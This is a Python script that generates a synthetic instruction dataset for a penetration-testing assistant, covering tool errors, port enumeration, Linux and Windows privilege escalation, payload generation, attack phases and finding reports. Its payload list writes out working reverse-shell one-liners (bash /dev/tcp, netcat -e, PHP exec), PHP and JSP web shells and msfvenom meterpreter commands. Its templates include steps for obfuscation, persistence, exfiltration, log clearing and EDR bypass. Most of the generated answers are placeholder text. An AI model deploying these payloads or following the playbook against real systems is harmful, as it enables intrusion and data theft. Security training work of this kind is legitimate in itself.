#!/usr/bin/env python3
"""
Extra Dataset Generator - Fill remaining to 15,000+
Focus on unique variations to avoid duplicates
"""

import json
import random
import hashlib
from pathlib import Path

output_dir = Path(__file__).parent.parent / "data" / "generated" / "extra"
output_dir.mkdir(parents=True, exist_ok=True)

seen_hashes = set()
all_samples = []

def add_sample(instruction, input_text, output):
    content = f"{instruction}|{input_text}"
    h = hashlib.md5(content.encode()).hexdigest()
    if h not in seen_hashes:
        seen_hashes.add(h)
        all_samples.append({
            "instruction": instruction,
            "input": input_text,
            "output": output
        })
        return True
    return False

print("Generating extra unique samples to reach 15k+...")

# =============================================================================
# 1. SPECIFIC ERROR HANDLING & TROUBLESHOOTING (500 samples)
# =============================================================================

errors = [
    ("nmap", "Host seems down", "Use -Pn to skip host discovery"),
    ("nmap", "Filtered ports", "Try different scan types like -sA or adjust timing"),
    ("gobuster", "Connection refused", "Check if target is alive and verify URL"),
    ("sqlmap", "No parameter found", "Manually specify parameter with -p flag"),
    ("metasploit", "Exploit failed", "Check payload compatibility and target version"),
    ("hydra", "Connection timeout", "Reduce threads or increase timeout values"),
    ("hashcat", "Out of memory", "Use -w 2 or reduce workload"),
    ("burp", "SSL handshake failed", "Check certificate settings and TLS version"),
    ("responder", "Interface not found", "Specify correct interface with -I"),
    ("bloodhound", "Neo4j connection refused", "Start Neo4j database first"),
    ("mimikatz", "Access denied", "Run as SYSTEM or with SeDebugPrivilege"),
    ("crackmapexec", "STATUS_LOGON_FAILURE", "Verify credentials and domain"),
    ("impacket", "KRB_AP_ERR_SKEW", "Sync time with DC using ntpdate"),
    ("kerbrute", "Clock skew too great", "Synchronize system clock"),
    ("evil-winrm", "WinRM connection failed", "Enable WinRM or check firewall"),
]

error_contexts = ["during recon", "during exploitation", "during post-exploitation", "during lateral movement"]

for tool, error, solution in errors:
    for context in error_contexts:
        for detail in ["first attempt", "after working initially", "on specific target", "intermittent issue"]:
            inst = f"Troubleshoot {tool} error: {error}"
            inp = f"Error: {error}. Context: {context}. Occurrence: {detail}"
            out = f"""**Troubleshooting**: {tool} - {error}

**Error**: {error}
**Context**: {context}
**Occurrence**: {detail}

**Root Cause Analysis**:
This error typically occurs when:
- Network connectivity issues
- Target configuration differences
- Permission/privilege problems
- Tool misconfiguration

**Solution**: {solution}

**Step-by-Step Fix**:
1. Verify basic connectivity to target
2. Check tool configuration and options
3. {solution}
4. Test with verbose/debug mode

**If Issue Persists**:
- Try alternative tool for same purpose
- Check target from different network position
- Verify scope and authorization
- Document for later investigation

**Prevention**:
- Test tools before engagement
- Have backup approaches ready
- Document working configurations

**Related Issues**:
- [Similar errors with same root cause]
- [Alternative error messages to watch for]"""
            add_sample(inst, inp, out)

print(f"Error handling: {len(all_samples)} samples")

# =============================================================================
# 2. SPECIFIC PORT/SERVICE ENUMERATION (600 samples)
# =============================================================================
start_count = len(all_samples)

services = [
    (21, "FTP", ["anonymous login", "version check", "banner grab", "bruteforce"]),
    (22, "SSH", ["version check", "key exchange", "bruteforce", "user enum"]),
    (23, "Telnet", ["banner grab", "bruteforce", "credential sniffing"]),
    (25, "SMTP", ["user enum", "relay test", "version check"]),
    (53, "DNS", ["zone transfer", "subdomain enum", "version check"]),
    (80, "HTTP", ["directory scan", "tech fingerprint", "vuln scan"]),
    (110, "POP3", ["banner grab", "bruteforce", "user enum"]),
    (135, "MSRPC", ["endpoint mapping", "interface enum", "exploit check"]),
    (139, "NetBIOS", ["name query", "share enum", "null session"]),
    (143, "IMAP", ["banner grab", "bruteforce", "capabilities"]),
    (389, "LDAP", ["anonymous bind", "user enum", "schema dump"]),
    (443, "HTTPS", ["cert analysis", "directory scan", "tech fingerprint"]),
    (445, "SMB", ["share enum", "version check", "null session", "signing"]),
    (1433, "MSSQL", ["version check", "bruteforce", "xp_cmdshell"]),
    (1521, "Oracle", ["sid enum", "version check", "TNS listener"]),
    (3306, "MySQL", ["version check", "bruteforce", "user enum"]),
    (3389, "RDP", ["version check", "bruteforce", "NLA check"]),
    (5432, "PostgreSQL", ["version check", "bruteforce", "default creds"]),
    (5985, "WinRM", ["version check", "auth methods", "command exec"]),
    (6379, "Redis", ["auth bypass", "config check", "data dump"]),
    (8080, "HTTP-Proxy", ["proxy test", "admin interface", "misconfig"]),
    (27017, "MongoDB", ["auth bypass", "db enum", "data dump"]),
]

for port, service, techniques in services:
    for technique in techniques:
        for scenario in ["external test", "internal test", "assumed breach"]:
            inst = f"Enumerate {service} service on port {port}"
            inp = f"Service: {service} (port {port}). Technique: {technique}. Scenario: {scenario}"
            out = f"""**Service Enumeration**: {service}

**Port**: {port}
**Technique**: {technique}
**Scenario**: {scenario}

**Enumeration Approach**:

**1. Initial Discovery**
```bash
nmap -sV -sC -p {port} [target]
```

**2. {technique.title()}**
```bash
# Specific command for {technique} on {service}
# [Tool-specific syntax]
```

**What to Look For**:
- Service version (CVE research)
- Default/weak credentials
- Misconfigurations
- Information disclosure

**{service}-Specific Checks**:
- {technique} implementation
- Known vulnerabilities for version
- Authentication mechanisms
- Data exposure risk

**Common Findings**:
- Anonymous/default access
- Version-specific vulnerabilities  
- Information leakage
- Configuration issues

**Next Steps Based on Findings**:
- Vulnerable version → Research exploits
- Weak auth → Credential attacks
- Misconfig → Abuse for access
- Info disclosure → Use for further recon

**Tools**:
- nmap scripts: --script {service.lower()}*
- Specialized tools for {service}
- Custom scripts if needed"""
            add_sample(inst, inp, out)

print(f"Service enumeration: {len(all_samples) - start_count} new samples")

# =============================================================================
# 3. PRIVILEGE ESCALATION VECTORS (500 samples)
# =============================================================================
start_count = len(all_samples)

linux_privesc = [
    ("SUID binaries", "find / -perm -4000", "execute with elevated privs"),
    ("sudo misconfig", "sudo -l", "run commands as root"),
    ("kernel exploit", "uname -a", "local kernel CVE"),
    ("cron jobs", "cat /etc/crontab", "writable script execution"),
    ("writable passwd", "ls -la /etc/passwd", "add root user"),
    ("capabilities", "getcap -r /", "abuse cap_setuid"),
    ("NFS no_root_squash", "cat /etc/exports", "mount and escalate"),
    ("docker socket", "ls -la /var/run/docker.sock", "container escape"),
    ("PATH hijacking", "echo $PATH", "writable PATH directory"),
    ("LD_PRELOAD", "sudo -l", "shared library injection"),
]

windows_privesc = [
    ("Unquoted service path", "wmic service get name,pathname", "binary planting"),
    ("Weak service perms", "accesschk.exe", "service binary replacement"),
    ("AlwaysInstallElevated", "reg query HKLM", "MSI as SYSTEM"),
    ("SeImpersonate", "whoami /priv", "potato attacks"),
    ("Stored credentials", "cmdkey /list", "runas with saved creds"),
    ("DLL hijacking", "procmon", "missing DLL replacement"),
    ("Scheduled tasks", "schtasks /query", "writable task binary"),
    ("UAC bypass", "systeminfo", "fodhelper/eventvwr abuse"),
    ("Token duplication", "incognito", "impersonate token"),
    ("Print Spooler", "Get-Service Spooler", "PrintNightmare"),
]

for technique, check_cmd, method in linux_privesc:
    for current_user in ["www-data", "low-priv user", "service account"]:
        inst = f"Linux privilege escalation via {technique}"
        inp = f"Technique: {technique}. Current user: {current_user}. Check: {check_cmd}"
        out = f"""**Linux Privilege Escalation**: {technique}

**Current User**: {current_user}
**Check Command**: `{check_cmd}`
**Method**: {method}

**Enumeration**:
```bash
{check_cmd}
```

**Exploitation**:
1. Identify exploitable {technique}
2. Verify current permissions allow abuse
3. Execute {method}
4. Confirm root access

**Example Exploitation**:
```bash
# Specific commands for {technique}
# [Exploitation steps]
```

**Why This Works**:
{technique} allows privilege escalation because {method} runs with elevated privileges that can be abused.

**Detection/Logging**:
- Command history
- Process execution logs
- File access monitoring

**Cleanup**:
- Remove added files/users
- Restore original configs
- Clear command history

**Alternatives if Blocked**:
- Try other privesc vectors
- Combine with lateral movement
- Report finding regardless"""
        add_sample(inst, inp, out)

for technique, check_cmd, method in windows_privesc:
    for current_user in ["IIS AppPool", "local user", "service account"]:
        inst = f"Windows privilege escalation via {technique}"
        inp = f"Technique: {technique}. Current user: {current_user}. Check: {check_cmd}"
        out = f"""**Windows Privilege Escalation**: {technique}

**Current User**: {current_user}
**Check Command**: `{check_cmd}`
**Method**: {method}

**Enumeration**:
```powershell
{check_cmd}
```

**Exploitation**:
1. Identify exploitable {technique}
2. Verify permissions allow abuse
3. Execute {method}
4. Confirm SYSTEM/Admin access

**Example Exploitation**:
```powershell
# Specific commands for {technique}
# [Exploitation steps]
```

**Why This Works**:
{technique} allows privilege escalation via {method} due to Windows configuration or permissions weakness.

**Tools**:
- PowerUp.ps1
- winPEAS
- BeRoot
- Seatbelt

**Detection**:
- Event logs (4688, 7045)
- EDR behavioral alerts
- File integrity monitoring

**Cleanup**:
- Remove planted files
- Revert configurations
- Clear event logs (if authorized)"""
        add_sample(inst, inp, out)

print(f"Privilege escalation: {len(all_samples) - start_count} new samples")

# =============================================================================
# 4. PAYLOAD GENERATION (400 samples)
# =============================================================================
start_count = len(all_samples)

payloads = [
    ("reverse shell", "bash", "bash -i >& /dev/tcp/LHOST/LPORT 0>&1"),
    ("reverse shell", "python", "python -c 'import socket,subprocess,os;...'"),
    ("reverse shell", "netcat", "nc -e /bin/sh LHOST LPORT"),
    ("reverse shell", "powershell", "powershell -nop -c \"$client = New-Object...\""),
    ("reverse shell", "php", "<?php exec('/bin/bash -c \"bash -i >& /dev/tcp/...\"');"),
    ("meterpreter", "windows x64", "msfvenom -p windows/x64/meterpreter/reverse_tcp"),
    ("meterpreter", "linux x64", "msfvenom -p linux/x64/meterpreter/reverse_tcp"),
    ("web shell", "php", "<?php system($_GET['cmd']); ?>"),
    ("web shell", "aspx", "<%@ Page Language=\"C#\" %>..."),
    ("web shell", "jsp", "<%Runtime.getRuntime().exec(request.getParameter(\"cmd\"));%>"),
    ("bind shell", "netcat", "nc -lvp PORT -e /bin/sh"),
    ("staged payload", "msfvenom", "windows/x64/meterpreter/reverse_https"),
    ("stageless payload", "msfvenom", "windows/x64/meterpreter_reverse_https"),
]

for payload_type, language, example in payloads:
    for evasion in ["none", "encoding", "obfuscation", "encryption"]:
        for target in ["Windows 10", "Windows Server", "Ubuntu", "CentOS", "web server"]:
            inst = f"Generate {payload_type} payload in {language}"
            inp = f"Type: {payload_type}. Language: {language}. Evasion: {evasion}. Target: {target}"
            out = f"""**Payload Generation**: {payload_type.title()}

**Language/Format**: {language}
**Evasion**: {evasion}
**Target**: {target}

**Base Payload**:
```
{example}
```

**Generation Command**:
```bash
# Generate {payload_type} for {target}
# [Specific generation command]
```

**Evasion ({evasion})**:
{f"- No evasion applied, basic payload" if evasion == "none" else ""}
{f"- Base64/URL encoding to bypass filters" if evasion == "encoding" else ""}
{f"- Variable substitution and string manipulation" if evasion == "obfuscation" else ""}
{f"- AES/XOR encryption with runtime decryption" if evasion == "encryption" else ""}

**Deployment Methods**:
1. File drop and execute
2. In-memory execution
3. Macro/script delivery
4. Exploit payload delivery

**Listener Setup**:
```bash
# Set up listener for {payload_type}
nc -lvnp PORT  # or msfconsole handler
```

**Testing**:
- Test in isolated environment first
- Verify connectivity to C2
- Check AV/EDR detection
- Confirm functionality

**OPSEC Considerations**:
- Payload may trigger AV/EDR
- Network traffic may be flagged
- Consider HTTPS/DNS for evasion"""
            add_sample(inst, inp, out)

print(f"Payload generation: {len(all_samples) - start_count} new samples")

# =============================================================================
# 5. SPECIFIC ATTACK SCENARIOS (600 samples)
# =============================================================================
start_count = len(all_samples)

scenarios = [
    ("webserver compromise", "RCE via upload", "www-data shell on Apache"),
    ("database breach", "SQLi to shell", "MySQL command execution"),
    ("AD foothold", "LLMNR poisoning", "NetNTLM hash capture"),
    ("cloud key theft", "SSRF to metadata", "AWS credentials from EC2"),
    ("container escape", "privileged pod", "node access from Kubernetes"),
    ("VPN compromise", "default creds", "internal network access"),
    ("mail server access", "OWA bruteforce", "mailbox access and phishing"),
    ("file share breach", "null session", "sensitive document access"),
    ("Wi-Fi compromise", "evil twin", "credential capture"),
    ("IoT exploitation", "default telnet", "network pivot point"),
]

phases = ["initial access", "establishing persistence", "internal recon", "data exfiltration", "covering tracks"]

for scenario, method, outcome in scenarios:
    for phase in phases:
        for constraint in ["time-boxed", "stealth required", "noisy allowed", "compliance test"]:
            inst = f"Execute {scenario} scenario: {phase} phase"
            inp = f"Scenario: {scenario}. Method: {method}. Phase: {phase}. Constraint: {constraint}"
            out = f"""**Attack Scenario**: {scenario.title()}

**Current Phase**: {phase.title()}
**Method Used**: {method}
**Outcome**: {outcome}
**Constraint**: {constraint}

**Phase Execution: {phase.title()}**

{f'''**Initial Access**:
Using {method} to achieve {outcome}:
1. Identify target system
2. Prepare exploitation approach
3. Execute and confirm access
4. Establish stable connection''' if phase == "initial access" else ""}

{f'''**Establishing Persistence**:
After {outcome}, ensure maintained access:
1. Create backup access method
2. Install persistence mechanism
3. Test persistence survives reboot
4. Document for cleanup''' if phase == "establishing persistence" else ""}

{f'''**Internal Recon**:
From {outcome} position:
1. Enumerate local system
2. Identify network position
3. Discover accessible resources
4. Map potential targets''' if phase == "internal recon" else ""}

{f'''**Data Exfiltration**:
Extract value from {scenario}:
1. Identify sensitive data
2. Stage for exfiltration
3. Choose covert channel
4. Transfer and verify''' if phase == "data exfiltration" else ""}

{f'''**Covering Tracks**:
Clean up after {scenario}:
1. Remove tools/payloads
2. Clear relevant logs
3. Restore configurations
4. Verify no artifacts remain''' if phase == "covering tracks" else ""}

**Constraint Adaptation ({constraint})**:
- Adjust techniques for {constraint}
- Balance speed vs. stealth
- Document any compromises made"""
            add_sample(inst, inp, out)

print(f"Attack scenarios: {len(all_samples) - start_count} new samples")

# =============================================================================
# 6. DEFENSIVE COUNTERMEASURES (400 samples)
# =============================================================================
start_count = len(all_samples)

defenses = [
    ("EDR", "CrowdStrike", ["process injection", "credential dumping", "lateral movement"]),
    ("EDR", "Defender ATP", ["PowerShell attacks", "suspicious behavior", "malware"]),
    ("SIEM", "Splunk", ["log correlation", "anomaly detection", "threat hunting"]),
    ("SIEM", "Azure Sentinel", ["cloud monitoring", "incident response", "automation"]),
    ("WAF", "ModSecurity", ["SQLi blocking", "XSS prevention", "rule bypass"]),
    ("IDS", "Suricata", ["network detection", "protocol analysis", "signature matching"]),
    ("NAC", "802.1X", ["port security", "device auth", "VLAN assignment"]),
    ("MFA", "various", ["credential protection", "bypass techniques", "implementation gaps"]),
]

for defense_type, product, capabilities in defenses:
    for capability in capabilities:
        for context in ["bypassing", "detecting bypasses", "tuning rules", "incident analysis"]:
            inst = f"{defense_type} ({product}): {capability}"
            inp = f"Defense: {product}. Capability: {capability}. Context: {context}"
            out = f"""**Security Control Analysis**: {defense_type}

**Product**: {product}
**Capability**: {capability}
**Analysis Context**: {context}

**{context.title()}**:

{f'''**Bypassing {product}**:
Understanding {capability} to identify weaknesses:
1. Research known bypasses
2. Test detection thresholds
3. Develop custom techniques
4. Validate evasion success''' if context == "bypassing" else ""}

{f'''**Detecting Bypasses**:
Ensuring {capability} catches evasion:
1. Understand attacker techniques
2. Review detection logic
3. Add missing signatures/behaviors
4. Test with purple team exercises''' if context == "detecting bypasses" else ""}

{f'''**Tuning Rules**:
Optimize {product} for {capability}:
1. Analyze false positive rates
2. Adjust thresholds
3. Add/modify detection rules
4. Validate against known attacks''' if context == "tuning rules" else ""}

{f'''**Incident Analysis**:
Using {product} for {capability} investigation:
1. Query relevant data sources
2. Correlate events
3. Timeline reconstruction
4. Impact assessment''' if context == "incident analysis" else ""}

**Key Considerations**:
- {product} strengths and weaknesses
- {capability} implementation details
- Integration with other controls
- Operational requirements"""
            add_sample(inst, inp, out)

print(f"Defensive countermeasures: {len(all_samples) - start_count} new samples")

# =============================================================================
# 7. REPORT WRITING TEMPLATES (300 samples)
# =============================================================================
start_count = len(all_samples)

finding_types = [
    "Remote Code Execution", "SQL Injection", "Cross-Site Scripting",
    "Authentication Bypass", "Privilege Escalation", "Information Disclosure",
    "Insecure Configuration", "Missing Security Headers", "Weak Cryptography",
    "Default Credentials", "Path Traversal", "Server-Side Request Forgery"
]

severities = ["Critical", "High", "Medium", "Low"]
affected_systems = ["web application", "API endpoint", "network service", "database", "authentication system"]

for finding in finding_types:
    for severity in severities:
        for system in affected_systems:
            inst = f"Write finding report for {finding}"
            inp = f"Finding: {finding}. Severity: {severity}. Affected: {system}"
            out = f"""## Finding: {finding}

**Severity**: {severity}
**Affected System**: {system}
**CVSS Score**: {"9.0+" if severity == "Critical" else "7.0-8.9" if severity == "High" else "4.0-6.9" if severity == "Medium" else "1.0-3.9"}

### Description
During testing of the {system}, a {severity.lower()}-severity {finding} vulnerability was identified. This vulnerability could allow an attacker to [specific impact based on finding type].

### Technical Details
**Location**: [Specific endpoint/parameter]
**Method**: [How vulnerability was identified]
**Payload**: [Example exploitation]

### Proof of Concept
```
[Reproduction steps]
1. Navigate to vulnerable endpoint
2. Submit crafted input
3. Observe vulnerable behavior
```

### Impact
- **Confidentiality**: {"High" if severity in ["Critical", "High"] else "Medium" if severity == "Medium" else "Low"}
- **Integrity**: {"High" if severity == "Critical" else "Medium" if severity in ["High", "Medium"] else "Low"}
- **Availability**: {"Potential impact" if severity in ["Critical", "High"] else "Limited"}

### Remediation
**Short-term**: [Immediate mitigation steps]
**Long-term**: [Permanent fix recommendations]

### References
- OWASP: [Relevant OWASP page]
- CWE: [Relevant CWE ID]

---"""
            add_sample(inst, inp, out)

print(f"Report templates: {len(all_samples) - start_count} new samples")

# =============================================================================
# SAVE EXTRA DATASET
# =============================================================================

print("\n" + "="*60)
print("Saving extra dataset...")

random.shuffle(all_samples)

output_file = output_dir / "extra_combined.jsonl"
with open(output_file, "w") as f:
    for sample in all_samples:
        f.write(json.dumps(sample) + "\n")

print(f"\n✅ EXTRA DATASET COMPLETE!")
print(f"   Total unique samples: {len(all_samples)}")
print(f"   Output: {output_file}")
print("="*60)
